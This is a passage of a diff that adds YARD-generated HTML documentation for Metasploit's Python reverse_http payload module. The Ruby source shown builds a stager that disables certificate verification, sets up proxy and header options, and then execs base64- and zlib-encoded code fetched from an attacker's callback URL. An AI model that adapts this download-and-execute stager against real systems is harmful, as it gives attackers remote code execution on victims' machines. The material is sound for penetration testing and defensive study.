+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\tsc.check_hostname=False\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\tsc.verify_mode=ssl.CERT_NONE\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\ths.append(ul.HTTPSHandler(0,sc))\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_proxy_host'>proxy_host</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_proxy_url'>proxy_url</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>http://</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_proxy_user'>proxy_user</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_proxy_pass'>proxy_pass</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+      <span class='id identifier rubyid_proxy_url'>proxy_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_uri_encode'>uri_encode</span><span class='lparen'>(</span><span class='id identifier rubyid_proxy_user'>proxy_user</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_uri_encode'>uri_encode</span><span class='lparen'>(</span><span class='id identifier rubyid_proxy_pass'>proxy_pass</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>@</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_proxy_url'>proxy_url</span> <span class='op'>&lt;&lt;</span> <span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_is_ipv6?'>is_ipv6?</span><span class='lparen'>(</span><span class='id identifier rubyid_proxy_host'>proxy_host</span><span class='rparen'>)</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_host'>proxy_host</span><span class='embexpr_end'>}</span><span class='tstring_content'>]</span><span class='tstring_end'>&quot;</span></span> <span class='op'>:</span> <span class='id identifier rubyid_proxy_host'>proxy_host</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_proxy_url'>proxy_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_proxy_port'>proxy_port</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>hs.append(ul.ProxyHandler({&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:scheme</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;:&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_proxy_url'>proxy_url</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;}))\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>unless</span> <span class='id identifier rubyid_proxy_user'>proxy_user</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_proxy_pass'>proxy_pass</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+      <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>hs.append(ul.ProxyBasicAuthHandler())\n</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_headers'>headers</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_headers'>headers</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>(&#39;User-Agent&#39;,&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:user_agent</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;)</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_headers'>headers</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>(&#39;Cookie&#39;,&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_cookie</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;)</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_cookie</span><span class='rbracket'>]</span>
+  <span class='id identifier rubyid_headers'>headers</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>(&#39;Referer&#39;,&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_referer</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;)</span><span class='tstring_end'>&quot;</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_referer</span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>o=ul.build_opener(*hs)\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>o.addheaders=[</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_headers'>headers</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>,</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>]\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_host</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exec(zlib.decompress(base64.b64decode(o.open(ul.Request(&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_generate_callback_url'>generate_callback_url</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;,None,{&#39;Host&#39;:&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:header_host</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;})).read())))\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exec(zlib.decompress(base64.b64decode(o.open(&#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_generate_callback_url'>generate_callback_url</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;).read())))\n</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_py_create_exec_stub'>py_create_exec_stub</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+9
+10
+11
+12
+13
+14
+15
+16</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/reverse_http.rb', line 9</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='kw'>super</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
+    <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Opt.html" title="Msf::Opt (module)">Opt</a></span></span><span class='op'>::</span><span class='id identifier rubyid_http_header_options'><span class='object_link'><a href="../../Opt.html#http_header_options-class_method" title="Msf::Opt.http_header_options (method)">http_header_options</a></span></span> <span class='op'>+</span>
+    <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Opt.html" title="Msf::Opt (module)">Opt</a></span></span><span class='op'>::</span><span class='id identifier rubyid_http_proxy_options'><span class='object_link'><a href="../../Opt.html#http_proxy_options-class_method" title="Msf::Opt.http_proxy_options (method)">http_proxy_options</a></span></span>
+  <span class='rparen'>)</span>
+  <span class='id identifier rubyid_deregister_options'>deregister_options</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HttpProxyType</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="required_space-instance_method">
+  
+    #<strong>required_space</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Determine the maximum amount of space required for the features requested</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/reverse_http.rb', line 142</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_required_space'>required_space</span>
+  <span class='comment'># Start with our cached default generated size
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>=</span> <span class='id identifier rubyid_cached_size'>cached_size</span>
+
+  <span class='comment'># Add 100 bytes for the encoder to have some room
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>100</span>
+
+  <span class='comment'># Make room for the maximum possible URL length
+</span>  <span class='id identifier rubyid_space'>space</span> <span class='op'>+=</span> <span class='int'>256</span>
+
+  <span class='comment'># The final estimated size
+</span>  <span class='id identifier rubyid_space'>space</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:31:27 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
